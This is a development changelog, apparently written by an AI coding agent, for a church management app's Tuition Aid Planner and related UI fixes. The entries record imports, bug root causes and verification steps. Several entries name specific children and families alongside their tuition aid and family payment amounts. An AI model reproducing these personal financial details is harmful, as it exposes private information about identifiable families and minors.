- **Verified end-to-end** with a Node harness against the actual served (post-`String.raw`) code: built a small roster with a K-8 pair, two unlinked LHS students, and one pipeline kid whose birth year makes them K-eligible this year — confirmed the pipeline kid never appears in the K-8 table, both LHS rows show Link buttons, clicking the Family header sorts K-8 alphabetically and flips direction on a second click, the Enroll button renders for the age-eligible pipeline kid, and `tapEnrollPipeline()` sends exactly `PATCH /tuition-aid/students/5 {"is_pipeline":false,"base_grade":"K"}`. `npm test` (37/37); `node --check` on all touched files and all 3 built `<script>` blocks.

### 2026-07-16 (v1.21.0 — Tuition Aid Planner: real Import History UI, no more hand-extraction)
- **Reported**: "on 1.20.3 and don't see a way to import anything" — the v1.20.3 "import" was a hardcoded seed baked into `db.js` at build time (extracted by hand from a spreadsheet the user sent), not a self-service feature. Confirmed with the user via a quick clarifying question: they wanted an actual upload button so they (or a coworker) can bring in an updated workbook themselves next time, without sending the file and waiting on a code change.
- **Approach decision**: this app has zero external JS dependencies anywhere — every chart is hand-rolled SVG, no Chart.js, no UI framework. Bundling a third-party XLSX parsing library (the obvious shortcut — e.g. SheetJS) would have been the first dependency in the whole codebase, plus it needs to satisfy the strict CSP (`script-src 'self'`) and add real page weight. Instead: XLSX is just a ZIP of XML files, and modern browsers can decompress DEFLATE natively via `DecompressionStream` — so the whole reader is hand-rolled JS with zero dependencies, consistent with how this codebase already does everything else.
- **What was built**: a ZIP container reader (central directory + local file headers, parsed by hand against the documented binary format), DEFLATE decompression via `DecompressionStream('deflate-raw')`, and a tag-scanning XML text extractor (deliberately *not* using `DOMParser`) tailored to Excel's well-defined, machine-generated XML shape — pulling shared strings and cell values into the same row/column grid shape `openpyxl` (the Python library used for the one-time TAP9 extraction) already produced, so the extraction logic could be ported directly.
- **Generalized the extraction** rather than reusing TAP9's one-time hardcoded version: year columns are now read dynamically from the header row's "Parent YYYY-YY" labels (a regex, not a fixed year list), so a future workbook with more years just works without a code change. The "skip whichever column is the current year" rule now reads `base_school_year` from config dynamically instead of a hardcoded "2026-27" string. TAP9's one specific hardcoded skip (Michael Hawkins' flagged-unreliable 2024-25 figure) was deliberately dropped — a general reusable tool can't know from the raw cell data alone that a source workbook's footnote calls a particular number an estimate — replaced with a preview table (checkbox per row, all checked by default) so a human reviews every row before anything is written, matching the same design principle as the existing per-year pin editing.
- **Import semantics**: new `POST /admin/api/tuition-aid/import-history` endpoint. Unlike the TAP9 seed (which used `INSERT OR IGNORE` so it would never clobber a manual edit made after the initial import), this endpoint upserts — overwrites an existing pin's `family_owed_cents` if the imported value differs — since the entire point of "import an updated file" is to bring in corrections. Returns created/updated/unchanged/newStudents counts so the confirmation message is honest about what actually changed, not just "done."
- **Verification, in order of how much confidence each step bought**:
  1. Extracted the browser-side parser into a standalone Node script (Node 22 has `DecompressionStream` too) and ran it against the actual uploaded workbook — output matched the already-shipped TAP9 Python extraction exactly (23 students, 74 pin-years, including Gonzalez/Alaya's full 7-year history).
  2. Re-ran the *exact same test* against the code as actually served — built `CHMS_HTML`, extracted the real `<script>` block, `eval()`'d it, and called the real `tapParseXlsxSheet`/`tapExtractHistoryRecords` functions directly — confirming the `String.raw` templating layer didn't mangle anything on the way out. (This is the same failure class as SC3-BUG1 from earlier in this project — a backslash that survives module evaluation differently than expected — so checking it here proactively, before shipping, rather than after a "nothing happens" report felt worth the extra step. One `new RegExp(dynamicString)` call was rewritten to use only fixed regex literals + a plain lookup specifically to avoid that risk class entirely, rather than getting the backslash count right and hoping.)
  3. Tested error paths deliberately: fed it the *old* workbook (no "Student Tuition History" sheet) and plain garbage bytes — both produced clear, specific error messages instead of a cryptic crash.
  4. `npm test` (37/37); `node --check` on every touched file and all 3 built `<script>` blocks.
  - **What's still unverified**: an actual browser. `DecompressionStream`, `DataView`, `TextDecoder`, and `File.arrayBuffer()` are all standard, well-supported Web APIs, but this environment has no live browser to click through the real file-picker → preview → import flow end to end.

### 2026-07-16 (v1.20.3 — Tuition Aid Planner: real multi-year student history import)
- **Context**: a coworker updated the source workbook and sent back a version with a brand-new "Student Tuition History" sheet — genuine per-student, per-year family-payment figures back to 2019-20. This is exactly the data TAP7 confirmed didn't exist anywhere at the time (that pass could only find one year's worth, in a "Parent 2025-26" column on a different sheet).
- **Extraction**: wrote a Python script against the sheet rather than hand-transcribing — 26 rows × 8 year-columns is enough surface area for a copy-paste slip to sneak in unnoticed. The script correctly handled: blank cells (student not enrolled that year — skip), `0` values (student enrolled and owed nothing that year — keep, distinct from blank), the `'?'` placeholders for Annette/Evelyn Crim (unreconciled — skip), and Michael Hawkins' 2024-25 figure specifically (the sheet has a number there, but its own footnote flags it as unreliable — excluded rather than trusted at face value). The 2026-27 column was also excluded on purpose: that's the current year, already represented by the `tuition_students` master row, and offset-0 reads bypass the per-year pin layer entirely (TAP6) — a pin there would just sit unused.
- **Result**: 19 currently-enrolled students (63 pin-years total, spanning 2019-20 through 2025-26) matched directly against existing `tuition_students` rows by (family, child). 3 students no longer enrolled (Flemming/LJ, Hawkins/John, Pyne/Bridget — 10 pin-years) needed new `active=0` shell rows created first, same mechanism as the "+ Add Family Record" UI button from TAP7, so their history has something to anchor to without polluting the live roster.
- **Replaced, not layered on top of**, the narrower `seedParent2025_26` from TAP7 — the new sheet's 2025-26 figures were spot-checked against the old seed's values first and matched exactly for every overlapping student, so this is a strict superset. Same idempotent `INSERT OR IGNORE` pattern (keyed on the `(student_id, school_year)` unique constraint), so no migration or cleanup step needed for databases that already ran the old seed.
- **Verified**: spot-checked several extracted rows by hand against the raw sheet dump before writing them into `src/db.js`'s seed constants (e.g. Gonzalez/Alaya 2019-20: sheet shows $1,550/25% → 155000 cents, matches). `npm test` (37/37); `node --check` on `db.js`.

### 2026-07-16 (v1.20.2 — Fix: History modal showed LHS award for K-8 students)
- **Reported**: "the WOL kids dont have an LHSA award that is high school only" — follow-up to a "current awards are not accurate" report. Asked which specific number looked wrong before investigating; the answer ("a specific student's number") plus this detail pinpointed it fast.
- **First ruled out the data itself**: cross-checked every row of `TUITION_SEED_K8` (the seed data from TAP1) against the source workbook's "K-8 Aid Detail 26-27" sheet by hand — all 20 students' Outside Aid / Timothy Award / Family Owed figures match exactly, including the $67,000 Timothy Award total. So this was never a data-entry problem in the original seed.
- **Real bug, introduced by TAP5's new History modal**: `tapOpenHistory()`'s "current" row unconditionally called `tapSplitFor(s,0)` and showed the LHS Award column whenever `s.attendsLHS !== false`. `attendsLHS` defaults to `true` for every student, including K-8/WOL ones — it's meant to answer "does this 8th-grader still plan to attend LHS once they get there," not "is this student currently in LHS." Every K-8 student's live row was therefore showing the seeded $1,200 LHS-standard-rate placeholder that TAP1's seed function stamps onto every `tuition_students` row regardless of grade (harmless everywhere else in the app, since nothing else reads it for a K-8 student — the main planner tables already correctly bucket K-8 vs LHS before deciding what to show). Mirror-image bug for LHS students: their row ran the K-8 split formula (`tapSplitFor`) against inputs that don't mean anything for them (LHS aid is a flat `lhs_award_cents`, not a tuition/outside-aid/family-% split), which would have shown a nonsense computed "Timothy Award" for anyone who opened an LHS student's history.
- **Fix**: branch on the student's actual current-year bucket (`tapBucketFor(s, tapGradeAt(s,0))`) instead of the `attendsLHS` flag — K-8 shows Outside Aid/Timothy Award/Family Owed with LHS Award as "—"; LHS shows LHS Award with the other three as "—", matching how the main planner tables already separate the two student types into different columns entirely.
- **Verified**: a Node harness constructing one K-8 student (Charlotte Enderle's real numbers: $6,000 outside aid / $2,000 Timothy award / $500 family owed) and one LHS student (Scarlett, $1,200 LHS award) and calling `tapOpenHistory()` directly — confirmed the rendered HTML shows exactly the right columns for each, with "—" everywhere the concept doesn't apply. `npm test` (37/37); `node --check` on all 3 built `<script>` blocks.
- **Process note**: this is the second bug in a row (after the "past year data" false alarm) where asking one clarifying question before touching code saved real time — "the WOL kids don't have an LHSA award" is a much faster path to the actual line of code than guessing across the whole rounding/percentage-drift theory floated in the prior turn.

### 2026-07-16 (v1.20.1 — Tuition Aid Planner: add historical records + real 2025-26 import)
- **Reported**: "past year data didn't import" — right after v1.17.0 shipped. Clarified with the user this meant the per-family list on a past year's panel was empty, not the tuition-rate figure.
- **Not a bug**: this was the documented empty state from v1.17.0 — there was genuinely no per-student history for years before this feature existed anywhere in the app. But the user then uploaded the actual source workbook (`Timothy_Tuition_Aid_Master.xlsx`, 7 sheets), which changed what was possible.
- **Read all 7 sheets before writing any code.** Confirmed the workbook's own "Read Me" tab: 2024-25 was partially *estimated* (3 of 17 students used an average, their real figures "weren't on file"), and everything before that is class-wide aggregate only — already fully represented by `tuition_history`/`tuition_year_rates`. So a full historical bulk-import genuinely isn't possible from this source; building one would have produced fabricated-looking precision on top of admittedly-incomplete data.
- **Found one real exception**: the "K-8 Aid Detail 26-27" sheet has a "Parent 2025-26" column — actual prior-year family-payment amounts for the 17 students still enrolled this year (3 students, all new this year or PK, correctly have no entry). Imported these as `tuition_student_years` pins for school_year `2025-26`, matched by (family, child) against the existing `TUITION_SEED_K8` roster. New `seedParent2025_26(db)` in `src/db.js`, idempotent via `INSERT OR IGNORE` against the `(student_id, school_year)` unique constraint, called from `_doInitDb` alongside the other one-time seeds.
- **Added the missing UI gap this exposed**: a "+ Add Family Record" button on the past-year panel (`tapOpenPastAdd()`/`tapSavePastAdd()` in `js-tuition-aid.js`, new `#tap-past-add-modal` in `html-tabs.js`) so staff can manually enter whatever historical figures they know from other, non-digitized sources going forward — creates an `active=0` `tuition_students` row (so it never shows up in the live current/future roster) purely to anchor a per-year pin. `POST /tuition-aid/students` extended to accept `active` in the request body (defaults to `1`, so every existing caller is unaffected).
- **New `tapReloadKeepingYear()`** — the existing `loadTuitionAid()` always resets to the current year on reload, which would have kicked the admin back to "today" right after adding a record for a past year. This refetches the bundle without resetting `_tapYearIdx`.
- **Rebased past v1.17.1–v1.20.0** (RDS5 token consolidation, RDS2b household view, two mobile/card fixes, Organization View, and the "best-guess Person match" feature — all landed on `main` while this fix was in progress): confirmed no file-level overlap beyond `js-core.js`'s `DEPLOY_VERSION` line and this changelog's insertion point — the `+ Add Family Record` modal/functions and the "best-guess suggestions" feature touch different parts of `js-tuition-aid.js`/`html-tabs.js` (the past-year panel vs. the existing Link-to-Person modal) and applied with `git apply --3way` cleanly on every other file.
- **Verified**: `npm test` (37/37), `node --check` on all 3 built `<script>` blocks, and — since this environment still has no live D1/browser — a Node harness that `eval()`s the actual served JS and calls `tapOpenPastAdd()` directly, confirming the year label resolves correctly (offset -1 → "2025-26") with no runtime errors. The two-step POST-then-PUT save flow (`tapSavePastAdd()`) was traced by hand rather than executed, since a full round-trip needs a real backend.

### 2026-07-16 (v1.20.0 — Tuition Aid: best-guess suggestions when linking a student to a Person)
- **Requested**: "for the tuition planner linking of students to people in records can you have it try to give best guess first before I have to search people."
- Roster rows imported without a `person_id` show a "Link" button (`tapOpenLinkPerson`) that opens a manual people-search modal. It now also runs an automatic best-guess lookup using the row's existing `family`/`child` text fields (last name / first name) against `GET /admin/api/people?q=...`, scores candidates (exact last-name match + exact first-name match ranks highest, partial substring matches rank lower), and shows up to 4 candidates as one-click suggestion chips above the manual search box — the top scorer gets a gold star + highlight. Clicking a suggestion pre-fills the hidden person-id/search-box exactly like picking from the manual autocomplete, with a "✓ selected" confirmation line; the manual search box stays available underneath in case none of the guesses are right. No matches → suggestions box stays empty, same as before (no regression for rows with no plausible match).
- New `tap-link-suggestions` div added to the existing `tap-link-modal` markup; new `tapLoadLinkSuggestions()`/`tapPickSuggestion()` functions in `js-tuition-aid.js`. No backend changes — reuses the existing `/admin/api/people?q=` endpoint already used by `acSearch()`.
- **Verified**: `npm test` (37/37); `node --check` on all 3 built `<script>` blocks; Playwright render with mocked candidates (`Emma Bordeleau`, `Ethan Bordeleau`, `Mark Bordelo`) confirms the exact first+last match is starred/highlighted first, clicking it fills the hidden `person_id` and search box correctly, and the confirmation message renders. (`src/frontend/js-tuition-aid.js`, `src/frontend/html-tabs.js`)

### 2026-07-16 (v1.19.2 — Fix: household photos cropped/skewed on card grid)
- **Reported bug**: household photos on the Households card grid rendered as a full-width 80px-tall banner strip with `object-fit:cover` — for portrait-oriented photos (typical family/individual photos), this produced extreme, unusable crops (e.g. an eyes-only close-up, or letterboxing), shown in a reporter screenshot.
- **Fix**: moved the photo to a fixed 64×64 square thumbnail on the right side of the card (text stays on the left, `flex:1`), matching the Person Profile/Household View pattern of using a proper square container for `object-fit:cover` — a square crop handles arbitrary source aspect ratios far more gracefully than a short-wide banner. `.h-card`'s default padding/cursor now apply normally (the old banner layout had overridden them to `padding:0`).
- **Verified**: `npm test` (37/37); `node --check` on all 3 built `<script>` blocks; Playwright render with a portrait-oriented mock photo confirms the square thumbnail renders correctly, positioned to the right, with no skewing.

### 2026-07-16 (v1.19.1 — Remove "Person record" badge from Organization cards)
- Removed the "Person record" pill badge shown on Organizations cards for entries synced from a Person record (`o.source === 'person'`). Cosmetic-only — the underlying click behavior for those entries (open the full Person Profile) is unchanged.

### 2026-07-16 (v1.19.0 — Organization View: mirrors Household View)
- **Requested**: "make organization view be like household view."
- **Before**: Organizations cards were unstyled (the `.hh-card` class they used had no CSS rules defined at all — likely a stale/typo'd class name from whenever this was built), and clicking a real organization jumped straight into the edit modal with no read-only view page (clicking a *person-sourced* "organization" — a synced Person record shown in this list — already correctly opened the full Person Profile; that path is unchanged).
- **Cards**: `renderOrganizations()` now uses the `.h-card`/`.h-name`/`.h-addr` classes directly (same classes Households already uses) instead of the unstyled `.hh-card` — zero new CSS, immediate visual parity with the Households card grid.
- **New "Organization View" full page** (`#organization-view` in `html-tabs.js`, `showOrganizationView()`/`closeOrganizationView()` in `js-households.js`): mirrors `#household-view` structure exactly — back link + name in the topbar, an Edit button, an icon-tile header (🏢 vs households' 🏠) with name/address, and a "Details" section. Reuses `.hv-hdr`/`.hv-icon-tile`/`.hv-name`/`.hv-addr`/`.hv-section-title` classes directly (including their existing mobile breakpoint) and the Person Profile's `.pv-row`/`.pv-row-key`/`.pv-row-val` label-value pattern for Type/Contact/Phone/Email/Website/Notes (with working `tel:`/`mailto:`/website links) — no new CSS needed anywhere.
- **Click flow now matches Households**: card click → `openOrgRow()` → (person-sourced orgs still go straight to Person Profile, unchanged) → real organizations open the new view page instead of jumping straight to editing. The view's Edit button opens the existing `org-modal` pre-filled (reusing the already-loaded `_orgRows` data — no extra fetch needed, unlike Household View which does re-fetch since its list doesn't carry full member detail).
- New `ov-mode` content-area class added alongside the existing `pv-mode`/`hv-mode` pattern; updated all three mode-setting functions (`showProfile`, `showHouseholdView`, `showOrganizationView`) and the generic `showTab()` cleanup to clear all three modes exhaustively, preventing multiple detail views from ever being stacked simultaneously.
- **Bug caught during verification**: initially missed the base `#organization-view{display:none;...}` rule that `#household-view`/`#profile-view` both have (only added the `.content-area.ov-mode > #organization-view{display:flex}` override) — without it, the view rendered inline below the Organizations list at all times instead of only when active. Fixed before shipping; confirmed via a full-page screenshot that the list view is now clean.
- **Verified**: `npm test` (37/37); `node --check` on all 3 built `<script>` blocks; a div-balance scan confirming `#organization-view` nests correctly inside `.app-shell`; and a Playwright pass exercising the whole flow — card click → view page renders → Edit button opens the modal pre-filled with the right data → Back button returns cleanly to the list.

### 2026-07-15/16 (v1.18.1 — Fix: Households/Organizations grids invisible on mobile)
- **Reported bug**: "Households nor organizations load" — reported from a mobile device (screenshot showed the search box, All/Members filter, "+ New Household" button, and pager correctly reading "1–50 of 281" — proving the data *did* load — but the household cards themselves were completely absent, just blank space).
- **Root cause**: `@media(max-width:767px){ .card-grid{display:none;} ... }` in `html-head.js`'s "MOBILE CONTACT CARDS" section (from the Phase 17 mobile pass). This was written to hide the People tab's card view on mobile in favor of its dedicated `.contact-list` mobile cards, but it targeted the wrong selector — the People tab's own card grid actually uses a *different* class, `.ppl-card-grid` (already separately and correctly hidden via the adjacent `#p-grid,#p-card-grid,.view-toggle{display:none!important;}` rule by ID). The plain `.card-grid` class is what `#h-grid` (Households) and `#org-grid` (Organizations) actually use — so this rule never did what it was originally meant to do, and instead silently made Households and Organizations unusable on any phone-width screen the whole time, with no fallback mobile view provided for either. RDS2b's new `#p-hh-grid` (People tab's Household toggle) also reuses `.card-grid` and would have inherited the same bug.
- **Fix**: deleted the stray `.card-grid{display:none;}` line. The People tab's mobile behavior is unaffected (verified: `#p-grid`/`#p-card-grid` still correctly hidden, `.contact-list` still shows, in a 390px-wide Playwright check) — it was never actually doing anything for the People tab in the first place.
- **Verified**: `npm test` (37/37); `node --check` on all 3 built `<script>` blocks; Playwright render at a 390px (iPhone-width) viewport confirms Households and Organizations cards now render (matching the exact bug shown in the reporter's screenshot), and the People tab's mobile contact-card view still works exactly as before.

### 2026-07-15 (v1.18.0 — RDS2b: People tab Household view toggle)
- **Requested**: keep the existing People List/Card views exactly as they are, but add a third toggle for a household-grouped card view (following up on RDS2's deferred RDS2b note).
- **Design decision**: reuses the Households tab's existing card grid (`.h-card`, `renderHouseholds()`, `GET /admin/api/households`) rather than building a new household-grouped member-list endpoint. This sidesteps RDS2b's original blocker entirely — no new pagination model needed, since it's a separate dataset (households, paginated 24/page) rather than trying to paginate the People list itself by household.
- **`src/frontend/js-households.js`**: `renderHouseholds(rows)` → `renderHouseholds(rows, targetId)`, defaulting to `'h-grid'` for the existing Households tab call site (zero behavior change there) so the People tab's new `#p-hh-grid` can reuse the exact same card-rendering logic.
- **`src/frontend/js-people.js`**: new `loadPeopleHouseholdView()`/`renderPeopleHouseholdPager()`/`peopleHhPage()` — calls the Households API filtered by the People tab's own search box (`peopleFilter.q`) and Members/All toggle (`peopleFilter.mt`), with its own pagination state (`_pHhOffset`/`_pHhTotal`) separate from both the Households tab's and the People list's own pagination. `loadPeople()`'s success callback now also refreshes the household view when it's the active mode — this is the single hook point every existing filter path (search debounce, Members toggle, filter drawer, archive toggle, tag toggles) already runs through, so all of them stay in sync with the household view for free, without touching each one individually.
- `applyPeopleViewMode()` extended to a third `'household'` state: hides `#p-grid`/`#p-card-grid`/the person pager, shows the new `#p-hh-view` pane, and hides the RDS2 quick-view panel (clicking a household card opens the existing full Household View page, not a person preview — showing an empty quick-view panel next to it would be confusing).
- **`src/frontend/html-tabs.js`**: added a third "Household" button to the existing `.view-toggle`, and a `#p-hh-view` pane (`#p-hh-grid` reusing the `.card-grid` class, `#p-hh-pager` matching the Households tab's pager markup) as a sibling of `#p-grid`/`#p-card-grid` inside `.ppl-list-col`.
- **No new CSS, no new backend endpoints** — `.card-grid`/`.h-card` already had the Phase 1 soft-shadow card treatment from RDS3, and the Households API already supported the `q`/`member_type`/`limit`/`offset` params needed.
- **Verified**: `npm test` (37/37); `node --check` on all 3 built `<script>` blocks; Playwright pass confirms the Household view renders correctly, the search box's typed term reaches the households fetch (`q=callahan&member_type=member`), and the quick-view panel correctly returns to `display:flex` after switching back to List view.

### 2026-07-15 (v1.17.1 — Redesign Phase 5 (RDS5): Volunteers/Scheduler token consolidation)
- **Context**: last piece of the app redesign's RDS-numbered phases. Discussed with the user whether to also do a full "native" rewrite of the Scheduler (currently a ~5,872-line separate embedded codebase transformed at load time by `scheduler-inline.js` — CSS scoping, ID renaming, deferred init — rather than built as native ChMS frontend modules). Decision: not now — that's a large, separate migration project (roughly 8x the size of the biggest tab touched so far, `js-people.js`), and the *visual* win is already largely captured today since the embedded Scheduler tab inherits the app's current CSS tokens automatically (`scheduler-inline.js` strips Scheduler's own `:root` block on embed). Scoped this pass to the actual remaining token-consolidation work instead.
- **Volunteers** (`html-head.js` `:root`): `--ev-navy`, `--ev-teal`, and `--ev-ink` turned out to be exact hex matches for `--color-navy`/`--color-teal`/`--charcoal` — now alias them directly, same dedup already done for `--ev-danger` in PAL1. `--ev-muted`, `--ev-cream`, and `--ev-moss` have no matching token and stay as their own literal values (`--ev-moss` is documented as a deliberately distinct second green from `--sage`, not a duplicate).
- `.vol-shell` (the Volunteers master-detail shell wrapping Signups/Ministry Roles/Events/Templates) converted from its own bordered-card shadow (`14px` radius, `0 16px 48px rgba(0,0,0,.14)`) to the Phase 1 borderless soft dual-shadow system (`20px` radius, `0 1px 3px rgba(20,20,40,.05),0 10px 24px rgba(20,20,40,.05)`) for visual consistency with Dashboard/Households/Giving/Reports.
- **Scheduler**: no changes needed — confirmed via the architecture that the embedded tab already renders with current tokens. The standalone `scheduler-html.js`/`scheduler/index.html` source values remain as PAL4 left them (only relevant to the retired, redirect-only `/scheduler` route).
- **Verified**: `npm test` (37/37); `node --check` on all 3 built `<script>` blocks; Playwright render of the Volunteers tab confirms the new card shadow/radius with no visual regressions to the sub-nav, filter pills, or signup list.
- **This closes out the RDS-numbered redesign phases** (RDS1–RDS5 all done or explicitly scoped/deferred with a reason — see `CLAUDE.md`). A native Scheduler rewrite remains a distinct, unscheduled future project if wanted later.

### 2026-07-15 (v1.17.0 — Tuition Aid Planner: multi-year editing)
- **Requested**: (1) see past years' data, (2) edit a future year's actual tuition once it's known, (3) edit awards, (4) per-family history over time, (5) edit outside aid since it changes year to year.
- **Data model**: two new tables. `tuition_year_rates` (school_year → tuition_cents) is a global override — one tuition rate applies to every K-8 student in a given year, so this is a single row per year, not per-student. `tuition_student_years` is the per-student ledger: outside aid / family % / exact Timothy award / exact family-owed / LHS award, one row per (student, school_year), kept even after the student's `tuition_students` row goes inactive so a graduated or removed family's history isn't lost. Both seeded/created via `migrations/0015_tuition_year_history.sql` + a runtime safety net in `db.js`; `tuition_year_rates` is also backfilled once from the existing `tuition_history` chart data (same real-world quantity, direct reuse).
- **API** (`src/api-tuition-aid.js`): `GET /tuition-aid/students` bundle now also returns `yearRates` and `studentYears`. New `PUT /tuition-aid/year-rates/:schoolYear`, `PUT`/`DELETE /tuition-aid/students/:id/years/:schoolYear` (single pin, merge-on-write so a partial PATCH-style body doesn't clobber other fields on the same row), and `POST /tuition-aid/year-pins/bulk` (bulk pin upsert, for Apply Policy/Auto-Balance/Reset when viewing a non-current year).
- **Frontend** (`src/frontend/js-tuition-aid.js`): year selector now spans base_school_year−5..+5 (was 0..+5 only). A new "Year Navigator" card holds the year selector plus an "actual tuition for this year" input that writes to `tuition_year_rates` — available for any year, past or future. **The current year (offset 0) is completely unchanged** — its sliders still write straight to the `tuition_students` master row, exactly as before. **Any other year** — editing outside aid, family share %, or LHS award now pins a `tuition_student_years` row for that specific year instead of mutating the master row, so pre-planning next year never disturbs this year (or any other year already pinned). Outside Aid is now an editable input everywhere (previously static text). Apply Aid Policy / Auto-Balance / Reset to Current Awards all branch the same way based on which year is being viewed. **Past years** render from the pin ledger directly (a new `tapRenderPastYearTable()`), not from the grade-progression engine — a departed/graduated student simply isn't reconstructible from today's roster, so this is a separate code path with its own honest "no data yet" empty state for years that predate this feature. A new "History" button on every roster row opens a per-student modal (`tapOpenHistory()`) listing every pinned year plus today's live numbers side by side, with a "Jump" link that switches the main view straight to that year.
- **Known, scoped limitation (TAP6 in CLAUDE.md)**: a pin made while a year was in the future does not automatically become "today's" master-row defaults once `base_school_year` is manually advanced at the start of a new school year — the pin data itself is preserved (visible via History or by selecting that year), it just isn't promoted. This is a deliberate scope cut, not an oversight: unifying offset-0 with the pin layer would touch the most heavily-used, best-tested path in the planner for a gap that only matters once a year, at a manual transition point staff already have to do other year-rollover work at.
- **Verification note**: this environment has no live D1/browser to test against. Verified via `npm test` (37/37), `node --check` on all 3 built `<script>` blocks extracted from `CHMS_HTML`, a byte-offset div-balance scan confirming the new `#tap-planner-current`/`#tap-planner-past` markup nests correctly inside `.content-area`, and — new for this session — a standalone Node harness that stubs `document`/`fetch` and actually **evaluates and calls** the served `tapSplitFor`/`tapTuitionForYear`/`tapUpsertPinLocal` functions against hand-computed expected values (confirmed pin isolation: pinning year+1's outside aid and family % changes that year's split without touching year 0's, and an exact-dollar pin at year+2 bypasses the %-based split entirely). This is a step beyond the syntax-only checks used in the three prior Tuition Aid fixes this week — worth reusing (stub `document`/`window`/`fetch`, `eval()` the extracted script text, call functions directly) whenever a future change is logic-heavy rather than structural. **Needs a real live-browser pass before being fully trusted** — no substitute for actually clicking through the year selector, editing a slider on a future year, and confirming the pin round-trips through a real D1 database.

### 2026-07-15 (v1.16.3 — Fix: Tuition Aid Planner data never loaded — missing API route)
- **Reported bug**: "still can't load tuition data" — reported immediately after v1.16.2 fixed the tab from rendering blank. The tab now appears in the right place, but shows "Could not load tuition aid data."
- **Root cause**: a completely different bug from the two HTML-nesting fixes before it — this one is server-side. `src/api-admin.js`'s `handleAdminApi()` dispatches `/admin/api/*` requests into `handleChmsApi()` only for a hardcoded allowlist of `seg.startsWith(...)` prefixes (`people`, `households`, `giving`, `reports/`, etc.). `tuition-aid` was never added to that list when the feature was originally built (v1.12.0) — `handleTuitionAidApi()` in `src/api-tuition-aid.js` was correctly written and correctly wired into `handleChmsApi()`'s own dispatch in `src/api-chms.js`, but requests never got that far. Every `GET /admin/api/tuition-aid/students` fell through to the generic `return json({error:'Not found'},404)` at the very bottom of `handleAdminApi()`. The frontend's `api()` helper (`src/frontend/js-core.js`) correctly treats any non-2xx JSON-error response as a rejection, which `loadTuitionAid()`'s `.catch()` renders as the generic "Could not load tuition aid data." message — matching the report exactly.
- **Fix**: added `seg.startsWith('tuition-aid')` to the dispatch allowlist in `handleAdminApi()`, alongside the other domain prefixes.
- **Verified**: `node --check` on `api-admin.js`; `npm test` (37/37). Traced the full request path by hand (`api()` → `/admin/api/tuition-aid/students` → `handleAdminApi()`'s allowlist → `handleChmsApi()`'s `isFinance` guard → `handleTuitionAidApi()`) to confirm the route now actually reaches the handler instead of stopping short.
- **Why this wasn't caught by the two earlier fixes**: both prior sessions verified the HTML-nesting fix (byte-offset scans, `node --check` on built `<script>` blocks) but never actually drove a live request through the API dispatch chain — a bug three layers removed from the DOM structure they were checking.

### 2026-07-15 (v1.16.2 — Fix: Tuition Aid Planner tab broken again — merge regression)
- **Reported bug**: "tuition aid planner still not working" — reported again the day after v1.16.1 shipped a fix for the same symptom.
- **Root cause**: not a repeat of the original v1.12.0 bug. The v1.16.1 fix (commit `29d5245`) correctly placed `#tab-tuitionaid` right before `</div><!-- /content-area -->`. But that fix was developed on a branch parallel to the RDS2 redesign work (`ad400ce`, the People tab filter drawer), which independently inserted its own new markup (`#people-filter-drawer`) at that exact same location in `src/frontend/html-tabs.js`. When the two branches were merged (`5babf16`), the merge interleaved the two additions in the wrong order — the filter drawer landed between the household-view close and `.content-area`'s close tag, which pushed the tuition-aid block back out to *after* the close tag. Same failure mode as before (`.tab-panel` with no flex parent to size it), reintroduced by a merge rather than by new code.
- **Fix**: moved the `#tab-tuitionaid` block back to immediately before `</div><!-- /content-area -->`. The People filter drawer stays where it landed (after the close tag) — that's correct for it, since it's `position:fixed` and doesn't need `.content-area` nesting, same reasoning as the modals in the v1.16.1 fix.
- **Verified**: byte-offset scan of the built `CHMS_HTML` confirms `#tab-tuitionaid` now falls between `.content-area`'s open and close tags; `node --check` on all 3 built `<script>` blocks (no syntax errors); `npm test` (37/37).
- **Process note**: when two branches touch the same insertion point in a large templated-HTML file (`html-tabs.js`), a clean merge doesn't guarantee correct *relative ordering* between two markup blocks that each depend on being on a specific side of a structural boundary (`.content-area`'s close tag, here). Worth a final byte-offset/div-balance sanity check on `html-tabs.js` after merging any two branches that both touched it, not just after a fresh build.

### 2026-07-14 (v1.16.1 — Fix: Tuition Aid Planner tab rendered blank)
- **Reported bug**: "the tuition aid planner tab is broken" / "it won't load" — the tab showed nothing at all.
- **Root cause traced to the original v1.12.0 build (commit 0903a86), not the redesign work**: confirmed by reproducing the identical blank render against that commit directly (via a git worktree) before touching anything. `src/frontend/html-tabs.js` closes `.content-area`/`.app-shell` with an explicit `</div><!-- /app-shell --->` marker partway through the file — everything after that marker (the `<!-- ═══ MODALS ═══ -->` section) is intentionally a sibling of `.app-shell`, which is fine for modals since they're all `position:fixed` and don't need flex-layout nesting. The Tuition Aid Planner tab-panel was appended at the very *end* of the file when it was built — *after* that closing marker and after its own two modals — instead of being inserted *before* it alongside the other `.tab-panel` divs. A byte-offset div-balance scan of the built `CHMS_HTML` confirmed `#tab-tuitionaid`'s effective nesting depth was 0 (i.e. outside `.app-shell` entirely) at that point, and `#tab-tuitionaid.parentElement` was literally `<body>` in a live render — so the tab-panel (not `position:fixed`, unlike modals) had no flex parent to size/position it and rendered ~1000px below the visible viewport, clipped by `body{overflow:hidden}`.
- **Fix**: moved the `<div id="tab-tuitionaid" class="tab-panel">...</div>` block (147 lines, pure relocation, byte-for-byte identical content) to just before the `</div><!-- /app-shell -->` marker, alongside the other real tabs. Left the two Tuition Aid modals (`tap-student-modal`, `tap-link-modal`) exactly where they were, after the marker — that location is correct for modals.
- **Verified**: reproduced the bug against the pre-fix commit, confirmed the fix resolves it via a byte-offset div-balance scan (nesting depth now stays inside `.app-shell` right up to `#tab-tuitionaid`) and a live-rendered Playwright screenshot (tab content now appears in the normal viewport instead of below it). `npm test` (37/37); `node --check` on all 3 built `<script>` blocks. The `$NaN` values visible in the screenshot are an artifact of the test's mock data using guessed field names (`family_share_pct`) instead of the real API's `fam_pct` — confirmed by reading `tapFromServerRow()`, not a second bug.
- **Debugging technique note for future "won't load" reports**: this one didn't show up via the usual `node --check` script-syntax scan (SC3-BUG1's pattern) since there was no JS syntax error — the bug was purely in the HTML nesting. When `node --check` comes back clean but a tab still renders blank, check whether the tab's container element is actually a *descendant* of `.content-area` in the live DOM (`el.parentElement` chain, or a div-balance scan of the built HTML around that tab's insertion point) before assuming it's a JS logic bug.

### 2026-07-14 (v1.16.0 — Redesign Phase 4 (RDS3 + RDS4b): Households/Person Profile/Reports card treatment)
